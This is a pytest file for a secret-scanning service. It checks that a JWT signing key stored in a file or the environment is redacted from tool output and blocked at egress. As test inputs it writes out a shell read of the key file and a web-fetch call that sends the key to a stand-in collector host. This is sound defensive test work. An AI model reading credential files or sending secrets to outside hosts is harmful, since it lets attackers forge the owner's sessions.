"""The session-signing key is one of the secrets the scanner knows.

With ``JWT_SECRET_KEY`` unset (the default) the key lives only in
``backend/.jwt_secret``: it never reached ``os.environ`` and a bare
``token_urlsafe`` string has no credential shape, so Edward's shell could
``cat`` it raw and a tool could send it out — and whoever holds it can mint
the owner's session. Now ``secret_scan.known_secrets()`` carries it, from
the file and from auth_service whatever its source, so it is redacted from
tool output and blocked at egress.
"""

import secrets

import pytest

pytestmark = pytest.mark.unit


@pytest.fixture
def key_file(tmp_path, monkeypatch):
    from services import secret_scan

    path = tmp_path / ".jwt_secret"
    key = secrets.token_urlsafe(48)
    path.write_text(key + "\n")
    monkeypatch.setattr(secret_scan, "JWT_SECRET_FILE", path)
    monkeypatch.setattr(secret_scan, "_jwt_file_cache", {"key": None, "value": None})
    monkeypatch.setattr(secret_scan, "_registered", {})
    monkeypatch.delenv("JWT_SECRET_KEY", raising=False)
    return path, key


def test_the_key_file_is_a_known_secret(key_file):
    from services import secret_scan

    _, key = key_file
    assert key in secret_scan.known_secrets().values()
    # A bare token_urlsafe string has no credential shape of its own.
    assert secret_scan.find_secrets(f"here: {key}") == []


def test_a_cat_of_the_key_file_is_redacted(key_file):
    from services import secret_scan

    _, key = key_file
    out, kinds = secret_scan.redact_secrets(f"$ cat backend/.jwt_secret\n{key}\n", secret_scan.known_secrets())
    assert key not in out
    assert kinds == ["env:JWT_SECRET_KEY"]


def test_the_key_is_blocked_at_egress(key_file):
    from services import secret_scan

    _, key = key_file
    hits = secret_scan.scan_egress("web_fetch", {"url": f"https://collector.example.net/?k={key}"},
                                   secret_scan.known_secrets())
    assert hits and any(f.kind.startswith("env:JWT_SECRET_KEY") for _, f in hits)


def test_a_rotated_file_is_reread(key_file):
    import os

    from services import secret_scan

    path, old = key_file
    assert old in secret_scan.known_secrets().values()
    new = secrets.token_urlsafe(48)
    path.write_text(new)
    st = path.stat()
    os.utime(path, ns=(st.st_atime_ns, st.st_mtime_ns + 1_000_000_000))
    values = secret_scan.known_secrets().values()
    assert new in values and old not in values


def test_no_file_is_no_finding(tmp_path, monkeypatch):
    from services import secret_scan

    monkeypatch.setattr(secret_scan, "JWT_SECRET_FILE", tmp_path / "missing")
    monkeypatch.setattr(secret_scan, "_jwt_file_cache", {"key": None, "value": None})
    monkeypatch.setattr(secret_scan, "_registered", {})
    assert isinstance(secret_scan.known_secrets(), dict)


def test_auth_service_registers_the_key_it_signs_with(monkeypatch, tmp_path):
    """A key from JWT_SECRET_KEY (never written to the file) is known too:
    auth_service registers whatever it resolved."""
    from services import auth_service, secret_scan

    monkeypatch.setattr(secret_scan, "JWT_SECRET_FILE", tmp_path / "missing")
    monkeypatch.setattr(secret_scan, "_jwt_file_cache", {"key": None, "value": None})
    assert auth_service.JWT_SECRET_KEY in secret_scan.known_secrets().values()

    env_key = secrets.token_urlsafe(32)
    monkeypatch.setattr(secret_scan, "_registered", {})
    secret_scan.register_known_secret("JWT_SECRET_KEY", env_key)
    out, _ = secret_scan.redact_secrets(f"token={env_key}", secret_scan.known_secrets())
    assert env_key not in out


def test_short_registrations_are_ignored(monkeypatch):
    from services import secret_scan

    monkeypatch.setattr(secret_scan, "_registered", {})
    secret_scan.register_known_secret("X", "short")
    secret_scan.register_known_secret("Y", None)
    assert secret_scan._registered == {}
